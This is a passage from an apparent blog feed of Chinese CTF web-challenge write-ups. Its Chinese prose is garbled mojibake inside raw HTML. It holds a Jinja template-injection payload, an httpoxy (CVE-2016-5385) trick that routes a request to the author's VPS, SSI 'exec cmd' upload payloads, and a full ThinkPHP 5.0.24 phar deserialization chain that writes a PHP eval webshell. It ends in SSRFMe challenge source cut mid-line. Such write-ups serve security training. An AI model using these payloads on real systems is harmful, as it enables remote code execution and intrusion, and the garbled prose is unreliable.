class="string">&#x27;/admin?name=&#123;&#123;()|attr(request.headers.name1)|attr(request.headers.name2)|attr(request.headers.name3)()|attr(request.headers.name4)(186)|attr(request.headers.name5)|attr(request.headers.name6)|attr(request.headers.name4)(request.headers.name7)|attr(request.headers.name4)(request.headers.name8)(request.headers.name9)|attr(request.headers.name10)()&#125;&#125;&amp;.js?&#x27;</span></span><br><span class="line">r=requests.get(url+payload,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h1 id="Flagé…é€ä¸­å¿ƒ"><a href="#Flagé…é€ä¸­å¿ƒ" class="headerlink" title="Flagé…é€ä¸­å¿ƒ"></a>Flagé…é€ä¸­å¿ƒ</h1><p>æŸ¥çœ‹ç½‘é¡µæºç å¯å¾—æç¤ºphpç‰ˆæœ¬ä¸é€šä¿¡æ¥å£åè®®fastcgi</p><p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220112144138763.png" alt="image-20220112144138763"></p><p>è€ƒå¯Ÿçš„æ˜¯æ¼æ´<code>cve-2016-5385</code>ï¼Œåœ¨vpsä¸Šå¼€å¯ç«¯å£ç›‘å¬ï¼ŒæŠ“åŒ…ï¼Œåœ¨æ–‡ä»¶å¤´æ·»åŠ <code>Proxy: http://vps:port</code>ï¼Œå‘é€requestæŠ¥æ–‡åå³å¯åœ¨vpsç›‘å¬åˆ°flag</p><p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220112152203716.png" alt="image-20220112152203716"></p><p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220112152217213.png" alt="image-20220112152217213"></p><h1 id="Shiro-æœªå®Œæˆ"><a href="#Shiro-æœªå®Œæˆ" class="headerlink" title="Shiro?(æœªå®Œæˆ)"></a>Shiro?(æœªå®Œæˆ)</h1><h1 id="Baby-Upload"><a href="#Baby-Upload" class="headerlink" title="Baby_Upload"></a>Baby_Upload</h1><p>.htaccess,ini,phpç­‰å‡è¢«è¿‡æ»¤ï¼Œæœªè¿‡æ»¤shtmlæ–‡ä»¶ï¼Œå¯ä»¥è¿›è¡Œssiæ³¨å…¥</p><p>ä¸Šä¼ <code>&lt;!--#exec cmd=&quot;dir /&quot; --&gt;</code>ï¼Œå¾—åˆ°flagæ–‡ä»¶åç§°</p><p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220113134447628.png" alt="image-20220113134447628"></p><p>å†ä¸Šä¼ <code>&lt;!--#exec cmd=&quot;cut -b 1-100 /ffffff?llll11111aaaaa4444ggggg&quot; --&gt;</code>,å¾—åˆ°flag</p><p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220113135151088.png" alt="image-20220113135151088"></p><p><a href="https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">SSIæ³¨å…¥æ¼æ´æ€»ç»“</a></p><h1 id="tp-æœªå®Œæˆ"><a href="#tp-æœªå®Œæˆ" class="headerlink" title="tp(æœªå®Œæˆ)"></a>tp(æœªå®Œæˆ)</h1><p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220114131205627.png"></p><p>è®¿é—®<code>public/index.php/index/index/upload</code>ï¼Œå¾—æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="variable">$FILES</span>= <span class="variable">$_FILES</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="variable">$_GET</span>,<span class="variable">$_POST</span>) <span class="keyword">as</span> <span class="variable">$_request</span>) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$_request</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>) &#123;</span><br><span class="line">                $&#123;<span class="variable">$_k</span>&#125; = <span class="keyword">$this</span>-&gt;func(<span class="variable">$_v</span>);</span><br><span class="line">                <span class="comment">//$_request[$_k] =  $&#123;$_k&#125;;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$file</span> = @<span class="variable">$FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$filename</span> = @<span class="variable">$FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;name&quot;</span>].<span class="string">&#x27;.jpg&#x27;</span>;</span><br><span class="line">        move_uploaded_file(<span class="variable">$file</span>,<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/&quot;</span>,<span class="variable">$filename</span>))&#123;</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;noPHP&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">&amp;<span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(is_array(<span class="variable">$var</span>))&#123;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$var</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>)&#123;</span><br><span class="line">                <span class="variable">$var</span>[<span class="variable">$_k</span>] = <span class="keyword">$this</span>-&gt;func(<span class="variable">$_v</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$var</span> = addslashes(<span class="variable">$var</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$var</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å­˜åœ¨å˜é‡è¦†ç›–ï¼Œä¸”å¯ä»¥é€šè¿‡unlinkè§¦å‘pharåè®®</p><p>åˆæœ‰tpç‰ˆæœ¬ä¸º5.0.24</p><p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220114140232863.png" alt="image-20220114140232863"></p><p>æ‰¾tp5.0.24ååºåˆ—åŒ–çš„pocï¼Œä¿®æ”¹ä¸€ä¸‹åœ¨æœ¬åœ°ç”Ÿæˆpharæ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Windows</span> &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">files</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$files</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;files = [<span class="variable">$files</span>]; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">append</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$error</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$parent</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span>, <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = <span class="variable">$output</span>; </span><br><span class="line">            <span class="keyword">$this</span>-&gt;append = <span class="keyword">array</span>(<span class="string">&quot;xxx&quot;</span>=&gt;<span class="string">&quot;getError&quot;</span>);    </span><br><span class="line">            <span class="keyword">$this</span>-&gt;error = <span class="variable">$modelRelation</span>;   </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span>, <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">parent</span>::__construct(<span class="variable">$output</span>, <span class="variable">$modelRelation</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">HasOne</span> <span class="title">extends</span> <span class="title">OneToOne</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">OneToOne</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">selfRelation</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$query</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;selfRelation = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;query = <span class="variable">$query</span>;    <span class="comment">//$queryæŒ‡å‘Query</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;bindAttr = [<span class="string">&#x27;xxx&#x27;</span>];<span class="comment">// $valueå€¼ï¼Œä½œä¸ºcallå‡½æ•°å¼•ç”¨çš„ç¬¬äºŒå˜é‡</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">db</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Query</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$model</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;model = <span class="variable">$model</span>; <span class="comment">//$this-&gt;model=&gt; think\console\Output;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Output</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">handle</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$styles</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;styles = [<span class="string">&#x27;getAttr&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle =<span class="variable">$handle</span>; <span class="comment">//$handle-&gt;think\session\driver\Memcached</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Memcached</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">handler</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler = <span class="variable">$handle</span>; <span class="comment">//$handle-&gt;think\cache\driver\File</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">File</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">options</span>=<span class="title">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options=[</span><br><span class="line">                <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">3600</span>,</span><br><span class="line">                <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>  =&gt; <span class="string">&#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../../../../../../../../../../var/www/html/&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            ];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tag = <span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">Memcached</span> = <span class="title">new</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcached</span>(<span class="title">new</span> \<span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>());</span><br><span class="line">    <span class="variable">$Output</span> = <span class="keyword">new</span> think\console\Output(<span class="variable">$Memcached</span>);</span><br><span class="line">    <span class="variable">$model</span> = <span class="keyword">new</span> think\db\Query(<span class="variable">$Output</span>);</span><br><span class="line">    <span class="variable">$HasOne</span> = <span class="keyword">new</span> think\model\relation\HasOne(<span class="variable">$model</span>);</span><br><span class="line">    <span class="variable">$window</span> = <span class="keyword">new</span> think\process\pipes\Windows(<span class="keyword">new</span> think\model\Pivot(<span class="variable">$Output</span>,<span class="variable">$HasOne</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); </span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$window</span>);        </span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);        </span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;RCE-No-Para&quot;&gt;&lt;a href=&quot;#RCE-No-Para&quot; class=&quot;headerlink&quot; title=&quot;RCE_No_Para&quot;&gt;&lt;/a&gt;RCE_No_Para&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>De1CTF2019-SSRFMe</title>
    <link href="https://wuyusanhua2021.github.io/2022/01/10/De1CTF2019-SSRFMe/"/>
    <id>https://wuyusanhua2021.github.io/2022/01/10/De1CTF2019-SSRFMe/</id>
    <published>2022-01-10T06:41:03.000Z</published>
    <updated>2022-01-10T15:08:01.800Z</updated>
    
    <content type="html"><![CDATA[<p> é¢˜ç›®ç›´æ¥ç»™å‡ºæºç ï¼Œæ˜¯flaskæ¡†æ¶ï¼Œè¿›è¡Œå®¡è®¡ï¼Œä»£ç æ³¨é‡Šå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(self.sandbox):  <span class="comment"># SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> self.checkSign():</span><br><span class="line">            <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            å½“actionåŒ…å«scanæ—¶,è‹¥paramä¸å­˜åœ¨åˆ™ä»¤result[data]=param</span></span><br><span class="line"><span class="string">            è‹¥å­˜åœ¨åˆ™å°†paramå†™å…¥./sandbox/result.txt</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> resp == <span class="string">&quot;Connection Timeout&quot;</span>:</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            å½“actionåŒ…å«readæ—¶,è¯»å–./sandbox/resultçš„å†…å®¹</span></span><br><span class="line"><span class="string">            ä½œä¸ºresult[data]çš„å€¼</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="comment">#åˆ¤æ–­signä¸getSign(action, param)æ˜¯å¦ç›¸ç­‰</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> getSign(self.action, self.param) == self.sign:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">åœ¨/geneSignè·¯ç”±ä¸‹,ä»¥getæ–¹å¼ä¼ å…¥å‚æ•°param,ä»¤actionå€¼ä¸º&#x27;scan&#x27;</span></span><br><span class="line"><span class="string">å¹¶è°ƒç”¨getSign()å‡½æ•°è¿›è¡Œå¤„ç†</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 